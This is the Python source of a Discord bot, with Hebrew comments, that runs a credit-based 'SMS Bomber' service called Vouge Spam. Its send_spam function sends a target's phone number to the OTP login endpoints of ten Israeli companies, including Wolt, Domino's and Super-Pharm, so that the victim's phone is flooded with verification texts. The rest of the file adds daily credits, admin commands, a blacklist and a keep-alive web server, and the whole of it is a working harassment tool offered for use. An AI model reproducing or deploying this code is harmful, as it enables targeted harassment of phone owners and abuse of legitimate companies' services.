import discord
from discord import app_commands
from discord.ext import commands
import os
import json
import httpx
import asyncio
from flask import Flask
from threading import Thread
import datetime

# --- מעקף Render ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run_flask).start()

# --- הגדרות ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "users_data.json"
BOT_ID_SYNC = "1499077731659284540" # ה-ID שביקשת לסנכרן

def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {"credits": {}, "blacklist": [], "last_daily": {}}
    return {"credits": {}, "blacklist": [], "last_daily": {}}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

# --- מנוע ה-Spam ---
async def send_spam(phone_val):
    endpoints = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
        {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
        for _ in range(2):
            tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(2)

# --- UI Components ---
class SpamModal(discord.ui.Modal, title="Vouge Spam - SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        data = load_data()
        phone_val = self.phone.value
        user_id = str(interaction.user.id)
        is_owner = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)

        if phone_val in data["blacklist"]:
            return await interaction.response.send_message(f"❌ המספר חסום!", ephemeral=True)
        
        # סנכרון קרדיטים לבוט או ל-Owner
        if is_owner or user_id == BOT_ID_SYNC:
            await interaction.response.send_message(f"🚀 שולח הפצצה (Owner Access)...", ephemeral=True)
        else:
            current = data["credits"].get(user_id, 0)
            if current <= 0: return await interaction.response.send_message("❌ אין קרדיטים!", ephemeral=True)
            data["credits"][user_id] -= 1
            save_data(data)
            await interaction.response.send_message(f"💣 נשלח! יתרה: {data['credits'][user_id]}", ephemeral=True)
        
        await send_spam(phone_val)

class SpamView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="spam_btn")
    async def spam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())

# --- הבוט וכל הפקודות מהסרטון ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())
        await self.tree.sync()

bot = MyBot()

# --- פקודות משתמש (User Commands) ---
@bot.tree.command(name="credits", description="בדיקת יתרה")
async def credits_check(interaction: discord.Interaction):
    data = load_data()
    uid = BOT_ID_SYNC if (str(interaction.user.id) == BOT_ID_SYNC or discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)) else str(interaction.user.id)
    balance = data["credits"].get(uid, 0)
    await interaction.response.send_message(f"💰 יתרה: `{balance}`", ephemeral=True)

@bot.tree.command(name="daily", description="מתנה יומית")
async def daily(interaction: discord.Interaction):
    data = load_data()
    uid = str(interaction.user.id)
    today = str(datetime.date.today())
    if data.get("last_daily", {}).get(uid) == today: return await interaction.response.send_message("כבר לקחת!", ephemeral=True)
    data["credits"][uid] = data["credits"].get(uid, 0) + 1
    if "last_daily" not in data: data["last_daily"] = {}
    data["last_daily"][uid] = today
    save_data(data)
    await interaction.response.send_message("🎁 קיבלת 1 קרדיט!", ephemeral=True)

@bot.tree.command(name="help", description="רשימת כל הפקודות")
async def help_cmd(interaction: discord.Interaction):
    embed = discord.Embed(title="Vouge Commands", color=discord.Color.blue())
    embed.add_field(name="User", value="`/credits`, `/daily`, `/help`", inline=False)
    embed.add_field(name="Admin", value="`/setup`, `/add_credits`, `/remove_credits`, `/blacklist_add`, `/blacklist_list`, `/restart`", inline=False)
    await interaction.response.send_message(embed=embed)

# --- פקודות אדמין (Admin Commands) ---
def is_admin():
    async def predicate(interaction: discord.Interaction):
        return discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) is not None
    return app_commands.check(predicate)

@bot.tree.command(name="setup")
@is_admin()
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="Vouge Spam Panel", description="Admin Only", color=discord.Color.red())
    await interaction.response.send_message(embed=embed, view=SpamView())

@bot.tree.command(name="add_credits")
@is_admin()
async def add_cr(interaction: discord.Interaction, member: discord.Member, amount: int):
    data = load_data()
    uid = str(member.id)
    data["credits"][uid] = data["credits"].get(uid, 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} ל-{member.mention}")

@bot.tree.command(name="remove_credits")
@is_admin()
async def rem_cr(interaction: discord.Interaction, member: discord.Member, amount: int):
    data = load_data()
    uid = str(member.id)
    data["credits"][uid] = max(0, data["credits"].get(uid, 0) - amount)
    save_data(data)
    await interaction.response.send_message(f"❌ הוסרו {amount} מ-{member.mention}")

@bot.tree.command(name="blacklist_add")
@is_admin()
async def bl_add(interaction: discord.Interaction, phone: str):
    data = load_data()
    if phone not in data["blacklist"]: data["blacklist"].append(phone)
    save_data(data)
    await interaction.response.send_message(f"🚫 {phone} חסום.")

@bot.tree.command(name="blacklist_list")
@is_admin()
async def bl_list(interaction: discord.Interaction):
    data = load_data()
    list_str = "\n".join(data["blacklist"]) if data["blacklist"] else "ריקה"
    await interaction.response.send_message(f"📜 רשימה שחורה:\n{list_str}")

@bot.tree.command(name="restart")
@is_admin()
async def restart(interaction: discord.Interaction):
    await interaction.response.send_message("🔄 ריסטארט...")
    os._exit(1)

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
